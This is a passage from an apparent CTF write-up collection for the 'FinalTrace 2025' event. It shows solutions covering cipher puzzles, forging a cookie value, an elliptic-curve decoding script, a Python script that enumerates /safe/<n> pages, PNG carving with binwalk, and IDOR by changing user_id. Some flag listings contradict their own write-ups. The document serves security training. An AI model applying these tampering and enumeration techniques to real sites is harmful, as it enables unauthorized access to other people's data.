gibberish</p><p>If you look closely, it’s the last part of a pastebin URL.</p><p>If you put it along with the full pastebin URL, you’ll be rewarded with DOT cipher</p><p>Put it in thins link, https://www.dcode.fr/pollux-cipher</p><p>When decoded gives the full actual FLAG! CYS{HERACTUALECHOES}</p><h2> Flag</h2><code> CYS{HERACTUALECHOES} </code><hr><h1 id="shattered-glass-logs"> Shattered Glass Logs <a href="/writeups/FinalTrace_2025/30-shattered-glass-logs.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="shattered-glass-logs"><span class="mr-2">Shattered Glass Logs</span><a href="#shattered-glass-logs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><strong>Category</strong>: [Forensics]<li><strong>Author</strong>: [Htarizzs]</ul><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>[Find the flag by reconstructing the hidden message scattered across multiple fragmented and tampered system logs.]</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="initial-analysis"><span class="mr-2">Initial Analysis</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li><strong>Reconnaissance</strong> Upon receiving several <code class="language-plaintext highlighter-rouge">.log</code> files, started with a manual inspection using cat and less to preview their contents and overall event structures.<li><strong>Metadata &amp; Consistency Check</strong> Examined timestamps, event flows, and error messages for clues about which log fragments could be authentic versus tampered.<li><strong>Keyword/Pattern Search</strong> Used <code class="language-plaintext highlighter-rouge">grep</code> to extract all unique data fragments and looked for recurring suspicious patterns—like out-of-place error codes or data that did not match the rest of the logs.</ul><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>[grep]<li>[neovim]<li>[online vignere cypher/decypher tool]</ul><h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1-list-and-inspect-log-files"><span class="mr-2">Step 1: [List and Inspect Log files]</span><a href="#step-1-list-and-inspect-log-files" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>[There are 5 log files, go through them]</p><h4 id="step-2-look-for-curly-braces"><span class="mr-2">Step 2: [Look for Curly braces]</span><a href="#step-2-look-for-curly-braces" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>[Look for logs containing the curly braces, as it is unusual for a log and most prolly a flag]</p><h4 id="step-3-search-for-any-word-that-is-out-of-place"><span class="mr-2">Step 3: [Search for any word that is out of place]</span><a href="#step-3-search-for-any-word-that-is-out-of-place" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>[As the found flag is encrypted using Vignere cypher, it requires an extra key, hence this word is prolly that! Here, it is cyscom]</p><h3 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>CYS{gl4ss_un5h4tt3rd}
</pre></table></code></div></div><h2> Flag</h2><code> CYS{gl4ss_un5h4tt3rd} </code><hr><h1 id="the-infinite-gate"> The Infinite Gate <a href="/writeups/FinalTrace_2025/31-the-infinite-gate.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="the-infinite-gate"><span class="mr-2">The Infinite Gate</span><a href="#the-infinite-gate" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><strong>Category</strong>: Web<li><strong>Author</strong>: Aadhyanth</ul><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Hark, seeker of the Inner Sanctum! Before thee looms the Infinite Gate, an edifice not wrought by mortal hands, but sung into existence from the very stone of eternity. Its Guardian, ancient beyond reckoning, permits none to pass save those deemed worthy. Upon presenting thy claim, a fragment of thy very essence - thy digital soul-print, if you will - is etched by the Gate’s magic. This token, unseen yet potent, marks thee as either Guest or… something more.</p><p>The mechanism of this ward is steeped in the forgotten lore of Elara the Astromancer. She who mapped the celestial curves believed that identity itself could be represented, measured, perhaps even… altered. It is said the Gate judges not the strength of thy arm nor the purity of thy heart, but the subtle quality of the essence-token it bestows upon thee.</p><p>The Guardian speaks true: a pass is merely a token. Can such a thing, once given, be reshaped by mortal will? Can simple wit suffice where might fails? Approach the Gate, receive thy mark, and discover if thou possess the wit to bend its ancient, rigid judgment to thy purpose. The Inner Sanctum awaits only those who can prove their essence is more than what the Gate initially perceives.</p><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>Devtools<li>Python</ul><h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1"><span class="mr-2">Step 1:</span><a href="#step-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Open devtools (F12) view cookies under the Application tab and log in with any username and password</p><h4 id="step-2"><span class="mr-2">Step 2:</span><a href="#step-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Alter the UserCunning cookie from false to true and move to the next page</p><h4 id="step-3-step-title"><span class="mr-2">Step 3: [Step Title]</span><a href="#step-3-step-title" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Copy the given json file and decrypt using Elliptic-Curve Cryptography</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">json</span>

<span class="k">def</span> <span class="nf">solve_challenge</span><span class="p">():</span>
    <span class="sh">"""</span><span class="s">
    Loads challenge.json, solves the ECC challenge, and prints the flag.
    </span><span class="sh">"""</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Loading challenge.json...</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">challenge.json</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">FileNotFoundError</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Error: challenge.json not found in the same directory.</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="k">except</span> <span class="n">json</span><span class="p">.</span><span class="n">JSONDecodeError</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Error: Could not decode challenge.json.</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span>

    <span class="n">p</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="sh">"</span><span class="s">p</span><span class="sh">"</span><span class="p">]</span>
    <span class="n">a</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="p">]</span>
    <span class="n">b</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="sh">"</span><span class="s">b</span><span class="sh">"</span><span class="p">]</span>
    <span class="n">xs_hex</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="sh">"</span><span class="s">xs_hex</span><span class="sh">"</span><span class="p">]</span>
    <span class="n">flag_bits_len</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="sh">"</span><span class="s">flag_bits_len</span><span class="sh">"</span><span class="p">]</span>

    <span class="c1"># The p % 8 check is no longer relevant
</span>    <span class="c1"># if p % 8 != 5:
</span>    <span class="c1">#     print(f"Warning: Prime p % 8 is not 5 (it's {p % 8}).")
</span>    <span class="c1">#     print("The mod_sqrt function may not be optimal, but let's proceed.")
</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Loaded curve parameters and </span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">xs_hex</span><span class="p">)</span><span class="si">}</span><span class="s"> x-coordinates.</span><span class="sh">"</span><span class="p">)</span>

    <span class="n">bit_string</span> <span class="o">=</span> <span class="sh">""</span>

    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">x_hex</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="n">xs_hex</span><span class="p">):</span>
        <span class="n">x</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">x_hex</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>

        <span class="c1"># Calculate y^2 = x^3 + ax + b (mod p)
</span>        <span class="c1"># We use pow(x, 3, p) for (x^3 % p)
</span>        <span class="n">x3</span> <span class="o">=</span> <span class="nf">pow</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
        <span class="n">ax</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span> <span class="o">*</span> <span class="n">x</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>

        <span class="c1"># Ensure intermediate results stay positive
</span>        <span class="n">y_squared</span> <span class="o">=</span> <span class="p">(</span><span class="n">x3</span> <span class="o">+</span> <span class="n">ax</span> <span class="o">+</span> <span class="n">b</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
        <span class="k">if</span> <span class="n">y_squared</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">y_squared</span> <span class="o">+=</span> <span class="n">p</span>

        <span class="c1"># --- MODIFIED LOGIC ---
</span>        <span class="c1"># The error "No modular square root" indicates that y^2 is not
</span>        <span class="c1"># always a quadratic residue. This implies the flag bit is
</span>        <span class="c1"># encoded in the *existence* of a root, not its value.
</span>        <span class="c1"># We check this using the Legendre symbol.
</span>
        <span class="c1"># legendre = pow(y_squared, (p - 1) // 2, p)
</span>        <span class="c1">#
</span>        <span class="c1"># legendre == 1  =&gt; y^2 is a quadratic residue (y exists, y != 0)
</span>        <span class="c1"># legendre == p - 1 =&gt; y^2 is a quadratic non-residue (y does not exist)
</span>        <span class="c1"># legendre == 0  =&gt; y^2 is 0 (y = 0)
</span>
        <span class="n">legendre_symbol</span> <span class="o">=</span> <span class="nf">pow</span><span class="p">(</span><span class="n">y_squared</span><span class="p">,</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>

        <span class="c1"># Hypothesis: Bit is 1 if it's a residue, 0 otherwise.
</span>        <span class="c1"># We treat the y=0 case (legendre_symbol == 0) as bit 0,
</span>        <span class="c1"># as the LSB of y=0 would be 0.
</span>        <span class="k">if</span> <span class="n">legendre_symbol</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
            <span class="n">bit_string</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="c1"># This covers non-residues (p-1) and the y=0 case (0)
</span>            <span class="n">bit_string</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span>

        <span class="c1"># --- END MODIFIED LOGIC ---
</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Successfully generated </span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">bit_string</span><span class="p">)</span><span class="si">}</span><span class="s"> bits.</span><span class="sh">"</span><span class="p">)</span>

    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">bit_string</span><span class="p">)</span> <span class="o">!=</span> <span class="n">flag_bits_len</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error: Expected </span><span class="si">{</span><span class="n">flag_bits_len</span><span class="si">}</span><span class="s"> bits, but got </span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">bit_string</span><span class="p">)</span><span class="si">}</span><span class="s">.</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span>

    <span class="c1"># Convert the full bit string into bytes
</span>    <span class="k">try</span><span class="p">:</span>
        <span class="n">flag_bytes</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">()</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">flag_bits_len</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
            <span class="n">byte_str</span> <span class="o">=</span> <span class="n">bit_string</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>
            <span class="n">byte_val</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">byte_str</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
            <span class="n">flag_bytes</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">byte_val</span><span class="p">)</span>

        <span class="c1"># Decode the bytes as an ASCII string
</span>        <span class="n">flag</span> <span class="o">=</span> <span class="n">flag_bytes</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">ascii</span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">--- FLAG ---</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">--------------</span><span class="sh">"</span><span class="p">)</span>

    <span class="k">except</span> <span class="nb">UnicodeDecodeError</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">Error: Could not decode the resulting bytes into ASCII.</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Raw bytes: </span><span class="si">{</span><span class="n">flag_bytes</span><span class="p">.</span><span class="nf">hex</span><span class="p">()</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="s">An error occurred during flag decoding: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="nf">solve_challenge</span><span class="p">()</span>


</pre></table></code></div></div><p>The above is working code that you can easily get through prompt engineering</p><h3 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>CYS{c00k1eS_ar3_m34nt_t0_b3_br0k3n}
</pre></table></code></div></div><h2> Flag</h2><code> CYS{c00k1eS_ar3_m34nt_t0_b3_br0k3n} </code><hr><h1 id="auditor-s-diary"> Auditor's Diary <a href="/writeups/FinalTrace_2025/32-auditors-diary.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="auditors-diary"><span class="mr-2">Auditor’s Diary</span><a href="#auditors-diary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><strong>Category</strong>: OSINT/TEXT<li><strong>Author</strong>: S S Kishore Kumar</ul><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>You given the Auditor’s Log: MDE-12.1993 from the Auditor’s diary .</p><p>There is famous foreign historical figure hidden in the file.</p><p>Identify him and the CEO of the company named after him is gives you the flag.</p><p>Flag format : CYS{<founder>} (all in lower-case , with no spaces).</founder></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="initial-analysis"><span class="mr-2">Initial Analysis</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Read the log and find its about Pablo Escobar , The company Escobar Inc. and its founder Olof K Gustafsson</p><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>Wikipedia<li>Textfile</ul><h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1-read-the-audit-diarymd"><span class="mr-2">Step 1: [Read the audit-diary.md]</span><a href="#step-1-read-the-audit-diarymd" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The log in it is based on Pablo Escobar.</p><h4 id="step-2-find-the-founder"><span class="mr-2">Step 2: [Find the founder]</span><a href="#step-2-find-the-founder" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The company based of him is Escobar Inc. and its founder is Olof K Gustafsson</p><h3 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>CYS{olofkgustafsson}
</pre></table></code></div></div><h2> Flag</h2><code> CYS{olofkgustafsson} </code><hr><h1 id="reconfiguration-terminal"> Reconfiguration Terminal <a href="/writeups/FinalTrace_2025/33-reconfiguration-terminal.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h1 id="reconfiguration-terminal">Reconfiguration Terminal</h1><p>Category: Web Exploitation Author: Yashwant Gokul P</p><h2 id="challenge-description"><span class="mr-2">Challenge Description:</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li>The site is minimal but the hint “Numbers are truth…” suggests a numeric resource pattern; a quick, low-noise check of <code class="language-plaintext highlighter-rouge">robots.txt</code> confirmed a disallowed numeric path and pointed toward a <code class="language-plaintext highlighter-rouge">/safe/&lt;id&gt;</code> namespace. Manual requests to a few <code class="language-plaintext highlighter-rouge">/safe/&lt;n&gt;</code> pages returned single characters inside the HTML (200 for valid indices, 404 at the end), which indicates an information-disclosure/enumeration weakness — essentially a CTF-style IDOR/predictable resource issue. The logical next step is to automate sequential requests to <code class="language-plaintext highlighter-rouge">/safe/1</code>, <code class="language-plaintext highlighter-rouge">/safe/2</code>, …, parse each response for the character, and concatenate them to reconstruct the <code class="language-plaintext highlighter-rouge">CYS{...}</code> flag</ul><h2 id="solution"><span class="mr-2">Solution:</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="initial-analysis"><span class="mr-2">Initial Analysis:</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>The site is minimal but the hint “Numbers are truth…” suggests a numeric resource pattern; a quick, low-noise check of <code class="language-plaintext highlighter-rouge">robots.txt</code> confirmed a disallowed numeric path and pointed toward a <code class="language-plaintext highlighter-rouge">/safe/&lt;id&gt;</code> namespace. Manual requests to a few <code class="language-plaintext highlighter-rouge">/safe/&lt;n&gt;</code> pages returned single characters inside the HTML (200 for valid indices, 404 at the end), which indicates an information-disclosure/enumeration weakness — essentially a CTF-style IDOR/predictable resource issue. The logical next step is to automate sequential requests to <code class="language-plaintext highlighter-rouge">/safe/1</code>, <code class="language-plaintext highlighter-rouge">/safe/2</code>, …, parse each response for the character, and concatenate them to reconstruct the <code class="language-plaintext highlighter-rouge">CYS{...}</code> flag.</ul><h3 id="tools-used"><span class="mr-2">Tools Used:</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>Python3</ul><h3 id="step-by-step-solution"><span class="mr-2"><strong>Step-by-Step Solution:</strong></span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ol><li><p>You are given with a url <a href="https://reconfiguration-terminal.netlify.app/">https://reconfiguration-terminal.netlify.app/</a></p><p><img src="image.png" alt="image.png" /></p><li><p>The site looks minimal, and it even displays the line “Numbers are truth, and truth always leaks through the cracks,” hinting at a possible IDOR weakness and suggesting there could be hidden clues in the page source, cookies, or other client-side artifacts. A good next step is to check the site’s <code class="language-plaintext highlighter-rouge">robots.txt</code> (e.g., <code class="language-plaintext highlighter-rouge">https://example.com/robots.txt</code>). That file, located at a site’s root, tells crawlers which paths to index or avoid—so it’s often a quick way to discover hidden or disallowed endpoints that might reveal useful information.</p><p><img src="image%201.png" alt="image.png" /></p><li><p>We found something interesting in <code class="language-plaintext highlighter-rouge">robots.txt</code>: <code class="language-plaintext highlighter-rouge">Disallow: /safe/420</code>. That suggests the site might expose a hidden page and could indicate an IDOR (Insecure Direct Object Reference) issue. Let’s probe <code class="language-plaintext highlighter-rouge">/safe/1</code> to see whether the site is vulnerable.Our intuition paid off: changing the page ID (for example to <code class="language-plaintext highlighter-rouge">2</code> and <code class="language-plaintext highlighter-rouge">3</code>) returned <code class="language-plaintext highlighter-rouge">Y</code> and <code class="language-plaintext highlighter-rouge">S</code>, which matches the expected flag pattern. We don’t yet know the flag’s length, so manually visiting pages would be slow and error-prone. Instead, we’ll automate the process with a simple Python script that requests <code class="language-plaintext highlighter-rouge">/safe/&lt;n&gt;</code>, extracts the character from each page, and builds the flag for us.</p><p><img src="image%202.png" alt="image.png" /></p><li><p>Our intuition paid off: changing the page ID (for example to <code class="language-plaintext highlighter-rouge">2</code> and <code class="language-plaintext highlighter-rouge">3</code>) returned <code class="language-plaintext highlighter-rouge">Y</code> and <code class="language-plaintext highlighter-rouge">S</code>, which matches the expected flag pattern. We don’t yet know the flag’s length, so manually visiting pages would be slow and error-prone. Instead, we’ll automate the process with a simple Python script that requests <code class="language-plaintext highlighter-rouge">/safe/&lt;n&gt;</code>, extracts the character from each page, and builds the flag for us.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre> <span class="kn">import</span> <span class="n">requests</span>
 <span class="kn">from</span> <span class="n">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
    
 <span class="n">BASE</span> <span class="o">=</span> <span class="sh">"</span><span class="s">https://reconfiguration-terminal.netlify.app/safe/{}</span><span class="sh">"</span>
 <span class="n">flag</span> <span class="o">=</span> <span class="sh">""</span>
 <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>
    
 <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
     <span class="n">url</span> <span class="o">=</span> <span class="n">BASE</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
     <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    
     <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">404</span><span class="p">:</span>
         <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">404 reached. Stopping.</span><span class="sh">"</span><span class="p">)</span>
         <span class="k">break</span>
     <span class="k">elif</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
         <span class="c1"># parse the HTML and get only the text inside &lt;p&gt;
</span>         <span class="n">soup</span> <span class="o">=</span> <span class="nc">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="sh">"</span><span class="s">html.parser</span><span class="sh">"</span><span class="p">)</span>
         <span class="n">p</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">p</span><span class="sh">"</span><span class="p">)</span>
         <span class="k">if</span> <span class="n">p</span><span class="p">:</span>
             <span class="n">char</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span>
             <span class="n">flag</span> <span class="o">+=</span> <span class="n">char</span>
             <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Page </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> found. Flag so far: </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
         <span class="k">else</span><span class="p">:</span>
             <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Page </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> found but no &lt;p&gt; tag!</span><span class="sh">"</span><span class="p">)</span>
    
     <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
    
 <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">Final Flag:</span><span class="sh">"</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>
    
</pre></table></code></div></div><p>chatgpt chat history : <a href="https://chatgpt.com/share/68f10e84-a100-8003-b373-216bc62c34b0">https://chatgpt.com/share/68f10e84-a100-8003-b373-216bc62c34b0</a></p><li><p>If we run this code on our system, it will automatically fetch all the pages and reveal the flag.</p><p><img src="image%203.png" alt="image.png" /></p></ol><h2 id="flag"><span class="mr-2">Flag:</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><blockquote><p>CYS{7h3_h0ur6l455_5h4773r3d_bu7_m3m0ry_r3m41n5_1n_fr46m3n75_pl3453_l1573n_cl053r_65537_2025}</p></blockquote><h2> Flag</h2><code> CYS{7h3_h0ur6l455_5h4773r3d_bu7_m3m0ry_r3m41n5_1n_fr46m3n75_pl3453_l1573n_cl053r_65537_2025} </code><hr><h1 id="paradox-parable"> Paradox Parable <a href="/writeups/FinalTrace_2025/34-unknown-challenge.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p>This is a Easy Forensics challenge based on data carving an appended archive from a PNG file.</p><p>The challenge includes a decoy flag and a misleading handbook:</p><p>Decoy Flag: Running strings Paradox_Parable_Image.png reveals the false flag: CYS{early_belief}. The player must use binwalk to scan the file’s binary structure for embedded signatures</p><p>Command: binwalk -e Paradox_Parable_Image.png will give a extracted file with the true flag : CYS{binwalk_reveals_truth}</p><h2> Flag</h2><code> CYS{early_belief} </code><hr><h1 id="temporal-mergepoint"> Temporal Mergepoint <a href="/writeups/FinalTrace_2025/35-unknown-challenge.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><blockquote><p>Author: riya mishra</p></blockquote><p>Challenge Description Access control in a futuristic research portal fails. Users can view logs via /portal?user_id=<id>. Can you find the secret flag by manipulating parameters?</id></p><p>Solution Initial Analysis Visited / and saw hints about the portal endpoint. Tried accessing my user ID first.</p><p>Tools Used Web Browser (Chrome/Edge)</p><p>Burp Suite (optional)</p><p>Python Flask server</p><p>Step-by-Step Solution Step 1: Check my own logs text Visited: http://127.0.0.1:5000/portal?user_id=10 Result: {“user”:”player”,”log”:”Access denied: unauthorized”} Access was denied for default user.</p><p>Step 2: Test other IDs text Changed to: http://127.0.0.1:5000/portal?user_id=9 Result: {“user”:”admin”,”log”:”CYS{temporal_merge_success}”} Found that the server returned the flag for user ID 9.</p><p>Flag text CYS{temporal_merge_success}</p><h2> Flag</h2><code> CYS{temporal_merge_success} </code><hr><h1 id="maelle-confrontation"> Maelle Confrontation <a 